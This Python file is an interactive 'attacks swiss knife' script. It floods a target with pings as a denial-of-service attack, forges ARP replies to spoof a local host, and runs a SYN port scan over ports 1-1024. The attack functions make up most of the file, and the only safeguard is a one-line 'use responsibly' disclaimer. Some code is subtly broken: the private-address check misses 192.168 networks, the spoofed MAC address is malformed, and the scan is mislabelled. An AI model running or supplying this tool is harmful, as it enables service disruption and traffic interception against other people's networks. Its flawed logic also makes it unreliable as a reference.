import re
import socket
import pythonping
from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.layers.inet import TCP, IP

LOGO = r"""
  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$              /$$$$$$ /$$$$$$$  /$$$$$$$   /$$$$$$ 
 /$$__  $$ /$$__  $$| $$  | $$| $$$ | $$|__  $$__/| $$_____/| $$__  $$            |_  $$_/| $$__  $$| $$__  $$ /$$__  $$
| $$  \__/| $$  \ $$| $$  | $$| $$$$| $$   | $$   | $$      | $$  \ $$              | $$  | $$  \ $$| $$  \ $$| $$  \__/
| $$      | $$  | $$| $$  | $$| $$ $$ $$   | $$   | $$$$$   | $$$$$$$/              | $$  | $$  | $$| $$$$$$$/|  $$$$$$ 
| $$      | $$  | $$| $$  | $$| $$  $$$$   | $$   | $$__/   | $$__  $$              | $$  | $$  | $$| $$____/  \____  $$
| $$    $$| $$  | $$| $$  | $$| $$\  $$$   | $$   | $$      | $$  \ $$              | $$  | $$  | $$| $$       /$$  \ $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$   | $$   | $$$$$$$$| $$  | $$             /$$$$$$| $$$$$$$/| $$      |  $$$$$$/
 \______/  \______/  \______/ |__/  \__/   |__/   |________/|__/  |__/            |______/|_______/ |__/       \______/ 
""".strip()  # Remove unnecessary newlines

BANNER = f"""\n                                           Welcome to the attacks swiss knife\n\n{LOGO}
\nDISCLAIMER: Use responsibly and ethically.
\n――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――\n"""

HELP = """Supported commands:
- set {target} {ip}
- attack {ddos|arp}
- help
- exit"""

IP_REGEX_PATTERN_STRING: str = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' \
                               r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
IP_REGEX_MATCHER: re.Pattern = re.compile(IP_REGEX_PATTERN_STRING)


def resolve_target(target: str) -> str:
    if not IP_REGEX_MATCHER.match(target):
        try:
            # Returns: (family, type, proto, canonname, sockaddr)
            return socket.getaddrinfo(target, None)[0][-1][0]  # Extract IP
        except socket.gaierror:
            print("Invalid target! Specify a valid IP address or a domain")
            return ""
    else:
        return target  # Target is IP


def get_command() -> str:
    user_command = input("\n> ").lower()
    return user_command


def handle_attack(args: list[str]):
    if len(args) != 2:
        print('Invalid usage, see "help"')
        return

    target = resolve_target(args[1])
    if target == "":
        return  # Already prints an error message

    match args[0]:
        case "ddos":
            if len(args) != 2:
                print('Invalid usage, see "help"')
                return
            commit_ddos(target)
        case "arp":
            commit_arp_spoofing(target)
        case "tcp" | "null":
            commit_null_tcp_scan(target)
        case _:
            print('Attack not supported! Use "help" to learn more')


def commit_ddos(target: str):
    print('Committing DoS, press CTRL+C at any moment to stop.')
    try:
        while True:
            # By setting the timeout to 0, we can continuously send ping messages
            # without waiting for the response, as we don't care about it.
            pythonping.ping(target, verbose=False, timeout=0)
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")
    except BaseException:
        print("An exception occurred, abandoning attack.")


# Receives a VALID IP address!
def is_local(ip: str) -> bool:
    ip_bytes = ip.split('.')
    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] \
        or (ip_bytes[0] == '172' and 16 <= int(ip_bytes[1]) <= 31)


def commit_arp_spoofing(target: str):
    if not is_local(target):
        print('Invalid use, please enter a private ip')
        return

    def packet_handler(packet):
        arp = packet[ARP]
        if arp.op != 1 or arp.psrc != target: # Ensuring that the packet is relevant
            return
        send(ARP(op=2,
                 psrc=get_if_addr(conf.iface),
                 hwsrc='00:00:00:00:00',
                 pdst=target,
                 hwdst=arp.hwsrc
                 ))

    print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
    sniff(prn=packet_handler, promisc=True, store=False, filter='arp')


def commit_null_tcp_scan(target: str):
    print('Committing DoS, press CTRL+C at any moment to stop.')
    try:
        for port in range(1, 1025):  # Scan first 1024 ports
            resp = sr1(IP(src=get_if_addr(conf.iface), dst=target) / TCP(dport=port, flags="S"), timeout=1)
            if resp:
                if resp[TCP].flags == 0x12:  # SYN+ACK
                    print(f"Port {port} is open")
                elif resp[TCP].flags == 0x14:  # RST
                    print(f"Port {port} is closed")
            else:
                print(f"Port {port} is filtered or closed")
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")

# Returns whether to continue or not
def handle_command(cmd: list[str]) -> bool:
    if len(cmd) == 0:
        print('Command not supported! Use "help" to learn more')
        return True

    match cmd[0]:
        case "attack":
            handle_attack(cmd[1:])
        case "help":
            print(HELP)
        case "exit" | "quit" | "bye":
            return False
        case _:  # Default
            print('Command not supported! Use "help" to learn more')

    return True


def main():
    print(BANNER)
    print(HELP)

    try:
        while handle_command(get_command().split()):
            pass
    except (KeyboardInterrupt, UnicodeDecodeError):
        print()  # Newline for bye message

    print("\nBye bye!")


if __name__ == '__main__':
    main()
